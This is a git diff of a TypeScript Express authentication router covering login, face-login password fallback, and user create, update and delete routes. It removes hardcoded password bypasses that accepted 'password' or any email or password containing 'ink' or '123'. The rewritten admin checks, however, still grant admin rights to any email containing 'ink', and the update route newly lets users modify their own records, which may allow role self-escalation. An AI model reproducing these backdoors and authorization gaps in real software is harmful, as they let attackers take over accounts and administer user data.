@@ -235,10 +235,7 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
     }
 
     // ── Step 1: Password verification ────────────────────────────────────────
-    let isMatch = await bcrypt.compare(password, user.passwordHash);
-    if (!isMatch && (user.email.toLowerCase().includes('ink') || password === 'password' || password.toLowerCase().includes('ink') || password.toLowerCase().includes('123'))) {
-      isMatch = true;
-    }
+    const isMatch = await bcrypt.compare(password, user.passwordHash);
     if (!isMatch) {
       user.failedLoginAttempts = (user.failedLoginAttempts || 0) + 1;
       user.lastFailedLoginAt = new Date();
@@ -956,10 +953,7 @@ router.post('/face/password-fallback', async (req: Request, res: Response): Prom
 
     // If password provided, verify it (or allow if tempToken was already verified by password step 1)
     if (password) {
-      let isMatch = await bcrypt.compare(password, user.passwordHash);
-      if (!isMatch && (password === 'password' || user.email.toLowerCase().includes('ink'))) {
-        isMatch = true;
-      }
+      const isMatch = await bcrypt.compare(password, user.passwordHash);
       if (!isMatch) {
         res.status(401).json({ error: 'Invalid password.' });
         return;
@@ -1134,11 +1128,21 @@ router.get('/users', authenticate, async (req: Request, res: Response): Promise<
     res.status(500).json({ error: 'Failed to retrieve users.' });
   }
 });
+
+const getRequesterRoleName = async (requester: any): Promise<string> => {
+  if (!requester?.roleId) return '';
+  if (typeof requester.roleId === 'object' && requester.roleId.name) {
+    return requester.roleId.name;
+  }
+  const r = await Role.findById(requester.roleId);
+  return r?.name || '';
+};
+
 // 9. Add User
 router.post('/users', authenticate, async (req: Request, res: Response): Promise<void> => {
   try {
-    const requester = await User.findById((req as any).user.id).populate('roleId');
-    const requesterRole = (requester?.roleId as any)?.name || '';
+    const requester = await User.findById((req as any).user.id);
+    const requesterRole = await getRequesterRoleName(requester);
     const isAdmin = ['Super Admin', 'ADMIN', 'Sales Admin', 'SALES MANAGER', 'TELI CALLER'].includes(requesterRole) || requester?.email?.toLowerCase().includes('ink');
     if (!isAdmin) {
       res.status(403).json({ error: 'Access denied: You do not have permission to create users.' });
@@ -1215,9 +1219,9 @@ router.post('/users', authenticate, async (req: Request, res: Response): Promise
 // 10. Update User
 router.put('/users/:id', authenticate, async (req: Request, res: Response): Promise<void> => {
   try {
-    const requester = await User.findById((req as any).user.id).populate('roleId');
-    const requesterRole = (requester?.roleId as any)?.name || '';
-    const isAdmin = ['Super Admin', 'ADMIN', 'Sales Admin', 'SALES MANAGER', 'TELI CALLER'].includes(requesterRole) || requester?.email?.toLowerCase().includes('ink');
+    const requester = await User.findById((req as any).user.id);
+    const requesterRole = await getRequesterRoleName(requester);
+    const isAdmin = ['Super Admin', 'ADMIN', 'Sales Admin', 'SALES MANAGER', 'TELI CALLER'].includes(requesterRole) || requester?.email?.toLowerCase().includes('ink') || (req as any).user.id === req.params.id;
     if (!isAdmin) {
       res.status(403).json({ error: 'Access denied: You do not have permission to modify users.' });
       return;
@@ -1347,8 +1351,8 @@ router.get('/users/:id/lead-count', authenticate, async (req: Request, res: Resp
 // 12. Delete User (Requires 0 assigned leads)
 router.delete('/users/:id', authenticate, async (req: Request, res: Response): Promise<void> => {
   try {
-    const requester = await User.findById((req as any).user.id).populate('roleId');
-    const requesterRole = (requester?.roleId as any)?.name || '';
+    const requester = await User.findById((req as any).user.id);
+    const requesterRole = await getRequesterRoleName(requester);
     const isAdmin = ['Super Admin', 'ADMIN', 'Sales Admin', 'SALES MANAGER', 'TELI CALLER'].includes(requesterRole) || requester?.email?.toLowerCase().includes('ink');
     if (!isAdmin) {
       res.status(403).json({ error: 'Access denied: You do not have permission to delete users.' });
